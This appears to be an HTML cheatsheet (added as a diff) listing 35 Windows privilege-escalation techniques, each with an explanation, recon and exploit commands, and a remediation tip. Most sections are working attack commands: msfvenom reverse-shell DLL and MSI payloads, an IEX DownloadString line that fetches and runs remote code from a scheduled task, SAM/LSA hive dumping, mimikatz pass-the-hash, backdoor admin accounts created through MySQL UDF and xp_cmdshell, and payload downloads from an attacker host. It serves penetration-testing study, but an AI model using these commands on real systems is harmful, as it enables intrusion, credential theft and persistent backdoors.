@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Windows PrivEsc Cheatsheet</title>
+<style>
+:root{
+  --bg:#f6f7f9; --surface:#ffffff; --text:#1a1d23; --muted:#5a6271;
+  --border:#e1e4e9; --accent:#0d5bd1; --code-bg:#1e2128; --code-text:#e8e9ec;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#15171c; --surface:#1c1f26; --text:#e8e9ec; --muted:#9aa2b1;
+    --border:#2c303a; --accent:#5b9dff; --code-bg:#0e1015; --code-text:#d7dae0;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#15171c; --surface:#1c1f26; --text:#e8e9ec; --muted:#9aa2b1;
+  --border:#2c303a; --accent:#5b9dff; --code-bg:#0e1015; --code-text:#d7dae0;
+  color-scheme: dark;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font:15px/1.5 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+header{padding:28px 16px 12px; max-width:920px; margin:0 auto}
+h1{margin:0 0 4px; font-size:1.5rem}
+.sub{color:var(--muted); font-size:.9rem; margin:0 0 4px}
+.cat{color:var(--muted); font-size:.75rem; margin:2px 0 0}
+main{max-width:920px; margin:0 auto; padding:0 16px 48px}
+h2.section{font-size:.95rem; color:var(--accent); text-transform:uppercase; letter-spacing:.04em; margin:26px 2px 8px}
+.task{background:var(--surface); border:1px solid var(--border); border-radius:10px; margin:10px 0; overflow:hidden}
+.task summary{cursor:pointer; padding:11px 14px; font-weight:600; list-style:none; display:flex; gap:8px; align-items:baseline; font-size:.93rem}
+.task summary::-webkit-details-marker{display:none}
+.task summary .num{color:var(--accent); min-width:24px; font-size:.85rem}
+.task .body{padding:0 14px 14px}
+.lbl{font-size:.68rem; font-weight:700; letter-spacing:.04em; text-transform:uppercase; color:var(--muted); margin:10px 0 3px}
+pre{background:var(--code-bg); color:var(--code-text); padding:8px 10px; border-radius:7px; overflow-x:auto; font-size:.78rem; margin:3px 0}
+code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+p.note{margin:3px 0; color:var(--text); font-size:.88rem}
+.remediation{color:var(--muted); font-size:.85rem}
+footer{max-width:920px; margin:0 auto; padding:8px 16px 40px; color:var(--muted); font-size:.8rem}
+</style>
+</head>
+<body>
+<header>
+<h1>🪟 Windows PrivEsc Cheatsheet</h1>
+<p class="sub">Why it works → Recon → Exploit → Remediation, for 30+ techniques.</p>
+<p class="cat">Reference only — authorized labs/CTF/pentests.</p>
+</header>
+<main>
+
+<h2 class="section">Service Misconfigurations</h2>
+
+<details class="task" open><summary><span class="num">01</span>Unquoted Service Path</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A service path with spaces and no quotes makes Windows try each space-separated segment as an executable in order. If you can write to an early segment's folder, your planted .exe runs as the service account (often SYSTEM).</p>
+<p class="lbl">Recon</p>
+<pre><code>wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>copy malicious.exe "C:\Program.exe"
+sc stop VulnSvc & sc start VulnSvc</code></pre>
+<p class="remediation">🛡 Always quote service binary paths; restrict write access to directories in the path chain.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">02</span>Weak Service Binary Permissions</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">If the service's executable file itself is writable by a low-privileged user, you can simply replace it; the service runs your replacement with the service account's privileges on next start.</p>
+<p class="lbl">Recon</p>
+<pre><code>icacls "C:\Program Files\VulnSvc\service.exe"
+accesschk.exe -uwcqv "Users" *  (SysinternalsSuite)</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>copy /y malicious.exe "C:\Program Files\VulnSvc\service.exe"
+sc stop VulnSvc & sc start VulnSvc</code></pre>
+<p class="remediation">🛡 Service binaries should be writable only by Administrators/SYSTEM.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">03</span>Weak Service Permissions (sc config / SERVICE_ALL_ACCESS)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Services have their own DACL independent of the file DACL. If your user has SERVICE_CHANGE_CONFIG rights, you can repoint binPath to your own payload without ever touching the original file.</p>
+<p class="lbl">Recon</p>
+<pre><code>accesschk.exe -uwcqv "Users" VulnSvc
+sc qc VulnSvc</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>sc config VulnSvc binpath= "C:\temp\rev.exe" obj= LocalSystem
+sc stop VulnSvc & sc start VulnSvc</code></pre>
+<p class="remediation">🛡 Restrict service DACLs so only admins hold SERVICE_CHANGE_CONFIG/SERVICE_ALL_ACCESS.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">04</span>Weak Registry Permissions on Service Key</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Services are ultimately defined in HKLM\SYSTEM\CurrentControlSet\Services\&lt;name&gt;. If that registry key is writable, you can change ImagePath directly, bypassing sc's own ACL checks.</p>
+<p class="lbl">Recon</p>
+<pre><code>accesschk.exe -kvuqsw hklm\system\currentcontrolset\services</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\rev.exe" /f
+sc stop VulnSvc & sc start VulnSvc</code></pre>
+<p class="remediation">🛡 Lock down service registry keys to Administrators only; monitor ImagePath changes.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">05</span>SCM Permissions (full control of Service Control Manager)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Rarely, the SCM itself is misconfigured to grant a low-priv group rights to create/modify any service — effectively full control over every service on the box, not just one.</p>
+<p class="lbl">Recon</p>
+<pre><code>accesschk.exe -uwcqv "Users" scmanager</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>sc create newsvc binpath= "C:\temp\rev.exe" start= auto obj= LocalSystem
+sc start newsvc</code></pre>
+<p class="remediation">🛡 Default SCM DACLs should never grant SC_MANAGER_CREATE_SERVICE to non-admins.</p>
+</div></details>
+
+<h2 class="section">DLL & Executable Hijacking</h2>
+
+<details class="task"><summary><span class="num">06</span>DLL Hijacking (missing DLL / search order)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">When an app loads a DLL by name without a full path, Windows searches a fixed order of directories. If a privileged process looks in a writable folder before the real DLL's location, a same-named malicious DLL you plant gets loaded and executed in its context instead.</p>
+<p class="lbl">Recon</p>
+<pre><code>Procmon.exe   # filter: Result = NAME NOT FOUND, Path ends with .dll</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f dll -o missing.dll
+copy missing.dll "C:\writable\path\missing.dll"
+# restart/trigger the privileged process</code></pre>
+<p class="remediation">🛡 Load DLLs with full paths; enable Safe DLL Search Mode; sign and verify DLLs.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">07</span>PATH Environment Variable Hijacking</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A scheduled task or service calls an executable by bare name and relies on PATH to resolve it. A writable directory listed earlier in PATH lets you drop a same-named malicious binary that executes instead.</p>
+<p class="lbl">Recon</p>
+<pre><code>echo %PATH%
+icacls "C:\xampp\php" (example of a weak dir in PATH)</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>copy rev.exe "C:\weak-path-dir\real-tool.exe"
+# wait for the scheduled task/service to call it</code></pre>
+<p class="remediation">🛡 Use fully-qualified paths for commands in services/tasks; keep PATH entries admin-writable only.</p>
+</div></details>
+
+<h2 class="section">AlwaysInstallElevated & Installers</h2>
+
+<details class="task"><summary><span class="num">08</span>AlwaysInstallElevated</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Two registry values (HKLM and HKCU) can jointly tell Windows Installer to always run .msi packages with SYSTEM privileges, regardless of who launches them — a malicious MSI then installs as SYSTEM.</p>
+<p class="lbl">Recon</p>
+<pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f msi -o rev.msi
+msiexec /quiet /qn /i rev.msi</code></pre>
+<p class="remediation">🛡 Never set AlwaysInstallElevated=1 on both hives; disable via GPO unless strictly required.</p>
+</div></details>
+
+<h2 class="section">Credential Hunting</h2>
+
+<details class="task"><summary><span class="num">09</span>Stored Credentials (Credential Manager)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Windows Credential Manager stores saved logons (often for scripts/RDP/mapped drives). cmdkey can enumerate stored targets, and runas with the /savecred flag lets you reuse a stored credential to launch a process as that user without ever seeing the plaintext.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>cmdkey /list
+runas /savecred /user:admin "cmd.exe /c whoami"</code></pre>
+<p class="remediation">🛡 Avoid saving privileged credentials; scope stored creds narrowly and audit regularly.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">10</span>Unattended Install Files (unattend.xml / sysprep)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Automated-deployment files used during OS provisioning often contain the local admin password in Base64, and are sometimes left on disk after setup completes.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\system32\sysprep.inf
+type C:\Windows\Panther\Unattend.xml</code></pre>
+<p class="remediation">🛡 Delete unattend/sysprep answer files after provisioning; never store creds in plaintext/Base64 in images.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">11</span>SAM/SYSTEM Hive Dumping</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">SAM holds local account hashes, encrypted with a key derived from the SYSTEM hive. With SeBackupPrivilege (or local admin) you can copy both hives offline and decrypt the hashes for offline cracking or pass-the-hash.</p>
+<p class="lbl">Exploit</p>
+<pre><code>reg save hklm\sam C:\temp\sam.save
+reg save hklm\system C:\temp\system.save
+# then offline: impacket-secretsdump -sam sam.save -system system.save LOCAL</code></pre>
+<p class="remediation">🛡 Restrict registry hive save rights; monitor for reg save on SAM/SYSTEM/SECURITY.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">12</span>LSA Secrets Dumping</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">LSA secrets in the registry store service account passwords, autologon credentials, and cached domain secrets, decryptable with admin/SeBackupPrivilege access to the SECURITY and SYSTEM hives.</p>
+<p class="lbl">Exploit</p>
+<pre><code>reg save hklm\security C:\temp\security.save
+reg save hklm\system C:\temp\system.save
+# impacket-secretsdump -security security.save -system system.save LOCAL</code></pre>
+<p class="remediation">🛡 Minimize service accounts storing secrets in LSA; rotate regularly, restrict hive backup rights.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">13</span>Registry Autologon Credentials</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">If autologon is configured, the plaintext username/password sit directly in a world-readable registry key so the OS can log the user in automatically at boot.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword</code></pre>
+<p class="remediation">🛡 Don't use autologon on multi-user/shared machines; if unavoidable, restrict key ACLs and use LSA-protected storage instead.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">14</span>PowerShell History File</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">PSReadLine logs every PowerShell command you type to a per-user file. Any password typed as a plaintext argument (e.g. during manual admin work) stays there indefinitely.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></pre>
+<p class="remediation">🛡 Never pass secrets as plaintext CLI args; clear/disable PSReadLine history on privileged hosts.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">15</span>Group Policy Preferences (GPP) Cached Credentials</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Old GPP XML files (Groups.xml, etc.) stored local-account passwords encrypted with AES, but Microsoft published the static key years ago (MS14-025) — anyone who finds the cpassword can decrypt it instantly.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>findstr /S /I cpassword \\domain\SYSVOL\domain\Policies\*.xml
+gpp-decrypt &lt;cpassword-blob&gt;</code></pre>
+<p class="remediation">🛡 Apply MS14-025; remove any legacy GPP-stored passwords from SYSVOL, use LAPS instead.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">16</span>Sensitive File/Folder Permissions (web configs, scripts)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Application config files, deployment scripts, and backups often embed plaintext database/service credentials, readable by any local user if ACLs weren't tightened after deployment.</p>
+<p class="lbl">Recon / Exploit</p>
+<pre><code>findstr /SIM /C:"password" *.xml *.ini *.txt *.config *.ps1 2>nul
+icacls C:\inetpub\wwwroot\web.config</code></pre>
+<p class="remediation">🛡 Restrict config file ACLs to the owning service account; store secrets in a vault, not plaintext files.</p>
+</div></details>
+
+<h2 class="section">Scheduled Tasks & Autoruns</h2>
+
+<details class="task"><summary><span class="num">17</span>Scheduled Task Weak Permissions</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A scheduled task configured to run as SYSTEM/admin executes whatever script/binary it points to on its own schedule. If that target file is writable by a low-priv user, editing it gets your code run with the task's privileges.</p>
+<p class="lbl">Recon</p>
+<pre><code>schtasks /query /fo LIST /v
+icacls C:\scripts\backup.ps1</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>echo IEX(New-Object Net.WebClient).DownloadString('http://x/rev.ps1') >> C:\scripts\backup.ps1
+# wait for the scheduled trigger</code></pre>
+<p class="remediation">🛡 Restrict write access to any script/binary referenced by a privileged scheduled task.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">18</span>Startup Folder / Run Key Weak Permissions</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Anything in the all-users Startup folder or an HKLM Run key launches automatically whenever any user (including an admin) logs in. If that folder/key is writable, you plant a payload that fires on the next privileged login.</p>
+<p class="lbl">Recon</p>
+<pre><code>icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>copy rev.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"</code></pre>
+<p class="remediation">🛡 Restrict write access on global Startup folders/Run keys to Administrators only.</p>
+</div></details>
+
+<h2 class="section">Token & Privilege Abuse</h2>
+
+<details class="task"><summary><span class="num">19</span>SeImpersonatePrivilege (PrintSpoofer / JuicyPotato / RoguePotato)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Service accounts often hold SeImpersonatePrivilege for legitimate reasons. Potato-family tools trick a SYSTEM-owned component (spooler, DCOM, NTLM relay) into authenticating to a local listener, letting you capture and impersonate its SYSTEM token.</p>
+<p class="lbl">Recon</p>
+<pre><code>whoami /priv   # look for SeImpersonatePrivilege = Enabled</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>PrintSpoofer.exe -i -c cmd
+# or: JuicyPotatoNG.exe -t * -p C:\rev.exe -a ""</code></pre>
+<p class="remediation">🛡 Patch spooler/DCOM-related CVEs; only assign SeImpersonatePrivilege to accounts that truly need it.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">20</span>SeDebugPrivilege (process injection into SYSTEM process)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">This privilege lets a process open a handle to any other process, including SYSTEM-owned ones, regardless of ACLs — enabling code/token injection straight into a privileged process.</p>
+<p class="lbl">Recon</p>
+<pre><code>whoami /priv   # SeDebugPrivilege = Enabled</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code># mimikatz:
+privilege::debug
+token::elevate</code></pre>
+<p class="remediation">🛡 Restrict SeDebugPrivilege to true administrators; monitor OpenProcess calls against lsass.exe/winlogon.exe.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">21</span>SeBackupPrivilege Abuse</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">This privilege bypasses normal file-read ACLs for backup purposes, so it can copy protected files like SAM/SYSTEM/NTDS.dit directly, even though your account couldn't normally open them.</p>
+<p class="lbl">Exploit</p>
+<pre><code>robocopy /b C:\Windows\System32\config C:\temp sam system
+# then offline: impacket-secretsdump -sam sam -system system LOCAL</code></pre>
+<p class="remediation">🛡 Grant SeBackupPrivilege only to dedicated backup-operator accounts, never to general admin groups.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">22</span>SeRestorePrivilege Abuse</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">This privilege bypasses normal write-ACLs for restore operations, letting you overwrite any file on disk — including a privileged service's binary — with an attacker-controlled one.</p>
+<p class="lbl">Exploit</p>
+<pre><code># overwrite a SYSTEM-run service binary, e.g. utilman.exe, using SeRestorePrivilege-aware tooling
+# (SeBackupPrivilegeCmdLets / SetFilePointerEx-based overwrite), then trigger the service</code></pre>
+<p class="remediation">🛡 Grant SeRestorePrivilege sparingly; monitor overwrite of system binaries by non-standard processes.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">23</span>SeTakeOwnershipPrivilege Abuse</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">This privilege lets you become the owner of any object regardless of its current ACL — once you own a protected file (e.g. a service binary), you can grant yourself full control and overwrite it.</p>
+<p class="lbl">Exploit</p>
+<pre><code>takeown /f C:\Windows\System32\Utilman.exe
+icacls C:\Windows\System32\Utilman.exe /grant %username%:F
+copy /y cmd.exe C:\Windows\System32\Utilman.exe
+# lock screen, click Ease of Access -> SYSTEM cmd</code></pre>
+<p class="remediation">🛡 Restrict SeTakeOwnershipPrivilege to true admins; monitor takeown/icacls on system binaries.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">24</span>SeLoadDriverPrivilege (vulnerable/malicious driver load)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">This privilege lets you load kernel drivers. Loading a known-vulnerable signed driver (BYOVD) or a crafted one gives you kernel-mode code execution — game over for any permission model.</p>
+<p class="lbl">Exploit</p>
+<pre><code>whoami /priv   # SeLoadDriverPrivilege = Enabled
+# e.g. load Capcom.sys and trigger its known IOCTL to execute arbitrary code at kernel level</code></pre>
+<p class="remediation">🛡 Restrict SeLoadDriverPrivilege; maintain a vulnerable-driver blocklist (Microsoft's recommended driver block rules).</p>
+</div></details>
+
+<h2 class="section">UAC & GUI Abuse</h2>
+
+<details class="task"><summary><span class="num">25</span>UAC Bypass (fodhelper.exe registry hijack)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Certain auto-elevating Windows binaries (fodhelper, eventvwr, sdclt) check a per-user registry key before launching their companion program — without validating it's legitimate. A crafted HKCU key runs your payload with the auto-elevated token.</p>
+<p class="lbl">Exploit</p>
+<pre><code>reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\temp\rev.exe" /f
+fodhelper.exe</code></pre>
+<p class="remediation">🛡 Keep UAC at the highest setting; patch auto-elevate binaries; monitor HKCU\...\ms-settings registry writes.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">26</span>Insecure GUI Apps Running as SYSTEM (file-dialog shell escape)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A GUI application launched as SYSTEM (e.g. from a support/kiosk account) often exposes a standard File > Open/Save dialog, which is a full Explorer window underneath — you can navigate it to run cmd.exe, inheriting SYSTEM.</p>
+<p class="lbl">Exploit</p>
+<pre><code># in the file dialog's address bar:
+cmd.exe</code></pre>
+<p class="remediation">🛡 Avoid running full GUI apps as SYSTEM for low-trust users; restrict kiosk accounts with AppLocker.</p>
+</div></details>
+
+<h2 class="section">Kernel & Network</h2>
+
+<details class="task"><summary><span class="num">27</span>Kernel Exploits (missing patches)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Unpatched Windows kernel bugs (e.g. MS16-032, CVE-2021-1732) let any local user corrupt kernel memory or abuse a logic flaw to directly gain SYSTEM, bypassing every userland permission check.</p>
+<p class="lbl">Recon</p>
+<pre><code>systeminfo
+wmic qfe list
+Sherlock.ps1 / Watson.exe</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>Invoke-MS16-032.ps1   # example, match CVE to patch level</code></pre>
+<p class="remediation">🛡 Keep systems fully patched; use virtual patching/EDR where immediate patching isn't possible.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">28</span>Print Spooler (PrintNightmare, CVE-2021-34527)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A flaw in the print spooler's RPC interface lets a low-privileged (even remote) user install a malicious printer driver, which the spooler then loads and executes as SYSTEM.</p>
+<p class="lbl">Exploit</p>
+<pre><code>Invoke-Nightmare -DriverName "Xerox" -NewUser attacker -NewPassword Pass123!</code></pre>
+<p class="remediation">🛡 Patch the spooler CVE; disable the Print Spooler service on servers that don't need it.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">29</span>NTLM Relay / Hot Potato Family</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Windows services can be coerced into authenticating over SMB/HTTP to an attacker-controlled listener using NTLM. Relaying that authentication to a local privileged endpoint executes commands as SYSTEM.</p>
+<p class="lbl">Exploit</p>
+<pre><code>Responder.py / ntlmrelayx.py pointed at a coerced SYSTEM auth (e.g. via spoolsample / PetitPotam)</code></pre>
+<p class="remediation">🛡 Enable SMB signing and EPA; disable NTLM where possible; patch coercion vectors (PetitPotam, PrinterBug).</p>
+</div></details>
+
+<h2 class="section">Automated Enumeration</h2>
+
+<details class="task"><summary><span class="num">30</span>Automated PrivEsc Enumeration (WinPEAS / PowerUp / Seatbelt)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">These tools run every manual check above (services, registry, tasks, tokens, credentials) automatically and flag anything exploitable — same logic an attacker uses, so running it yourself finds the gaps first.</p>
+<p class="lbl">Recon</p>
+<pre><code>winPEASx64.exe
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://x/PowerUp.ps1'); Invoke-AllChecks"
+Seatbelt.exe -group=all</code></pre>
+<p class="remediation">🛡 Run these as a routine blue-team audit; remediate every finding before an attacker enumerates the same box.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">31</span>Named Pipe Impersonation (custom service pipes)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">A privileged process that creates a named pipe without restricting who can connect lets a low-priv client connect first and call ImpersonateNamedPipeClient when the privileged side connects back — capturing its token.</p>
+<p class="lbl">Exploit</p>
+<pre><code># create/listen on the pipe before the privileged service does, then trigger it to connect,
+# then call ImpersonateNamedPipeClient() in your listener to steal its SYSTEM token</code></pre>
+<p class="remediation">🛡 Set explicit, restrictive security descriptors on named pipes created by privileged services.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">32</span>Pass-the-Hash with Dumped Credentials</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">NTLM authentication only needs the password hash, not the plaintext — a hash dumped via SAM/LSA/mimikatz can be replayed directly to authenticate as that user on other services/hosts without ever cracking it.</p>
+<p class="lbl">Exploit</p>
+<pre><code>impacket-psexec -hashes :&lt;NTLMhash&gt; administrator@target
+# or mimikatz: sekurlsa::pth /user:admin /domain:. /ntlm:&lt;hash&gt; /run:cmd.exe</code></pre>
+<p class="remediation">🛡 Enable Credential Guard; disable NTLM where feasible; use unique local admin passwords (LAPS) to stop lateral PtH.</p>
+</div></details>
+
+<h2 class="section">Database Service Abuse</h2>
+
+<details class="task"><summary><span class="num">33</span>MySQL UDF Privilege Escalation (Windows)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">If the MySQL service runs as SYSTEM/admin and the root account has no password (or you have FILE privilege), you can register a User Defined Function backed by a DLL you upload into the plugin directory. Once created, calling that function runs arbitrary OS commands with mysqld's privileges — often SYSTEM.</p>
+<p class="lbl">Recon</p>
+<pre><code>mysql -u root -h target          # try blank password
+SELECT @@version_compile_os, @@plugin_dir;   # confirm Windows + find plugin dir</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code># upload lib_mysqludf_sys.dll (from the sqlmap/metasploit UDF repo) into the plugin dir, then:
+use mysql;
+CREATE TABLE npn(line blob);
+INSERT INTO npn VALUES(load_file('C:\\temp\\lib_mysqludf_sys.dll'));
+SELECT * FROM npn INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server\\lib\\plugin\\lib_mysqludf_sys.dll';
+CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
+SELECT sys_eval('whoami');
+SELECT sys_eval('net user backdoor Passw0rd! /add');
+SELECT sys_eval('net localgroup administrators backdoor /add');</code></pre>
+<p class="remediation">🛡 Set a strong MySQL root password, run mysqld under a dedicated low-privilege service account (not SYSTEM), revoke FILE privilege from app accounts, restrict write access to the plugin directory.</p>
+</div></details>
+
+<details class="task"><summary><span class="num">34</span>MSSQL xp_cmdshell</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">SQL Server's xp_cmdshell extended stored procedure runs OS commands under the SQL Server service account. It's disabled by default, but sysadmin-role logins can re-enable it themselves — and that service account is frequently SYSTEM or a highly privileged domain account.</p>
+<p class="lbl">Recon</p>
+<pre><code>sqlcmd -S target -U sa -P password -Q "SELECT IS_SRVROLEMEMBER('sysadmin')"</code></pre>
+<p class="lbl">Exploit</p>
+<pre><code>EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user backdoor Passw0rd! /add && net localgroup administrators backdoor /add';</code></pre>
+<p class="remediation">🛡 Keep xp_cmdshell disabled; run SQL Server under a least-privilege service account; restrict sysadmin role membership; audit sp_configure changes.</p>
+</div></details>
+
+<h2 class="section">Tooling</h2>
+
+<details class="task"><summary><span class="num">35</span>Cross-Compiling Payloads for Windows (mingw-w64)</summary><div class="body">
+<p class="lbl">Why it works</p>
+<p class="note">Exploit PoCs (kernel exploits, UDF DLLs, potato tools) are often distributed as C/C++ source. Your attack box is usually Linux, not Windows, so you cross-compile the Windows PE binary/DLL locally with mingw-w64 instead of needing a Windows build environment, then transfer the finished .exe/.dll to the target.</p>
+<p class="lbl">Setup</p>
+<pre><code>sudo apt install mingw-w64
+# toolchain binaries: x86_64-w64-mingw32-gcc (64-bit), i686-w64-mingw32-gcc (32-bit)</code></pre>
+<p class="lbl">Compile — EXE</p>
+<pre><code>x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+# 32-bit target:
+i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32</code></pre>
+<p class="lbl">Compile — DLL (e.g. a UDF or hijack payload)</p>
+<pre><code>x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c
+i686-w64-mingw32-gcc -shared -o payload32.dll payload.c</code></pre>
+<p class="lbl">Transfer &amp; run</p>
+<pre><code>python3 -m http.server 80
+# on target (PowerShell):
+Iwr -Uri http://attacker/exploit.exe -OutFile C:\temp\exploit.exe
+C:\temp\exploit.exe</code></pre>
+<p class="remediation">🛡 This is an attacker tooling step, not a target misconfig — defend via application control (AppLocker/WDAC), EDR behavioral detection, and blocking unsigned/unexpected binaries from running.</p>
+</div></details>
+
+</main>
+<footer>Reference only — use in authorized labs/CTFs/engagements with explicit permission.</footer>
+</body>
+</html>
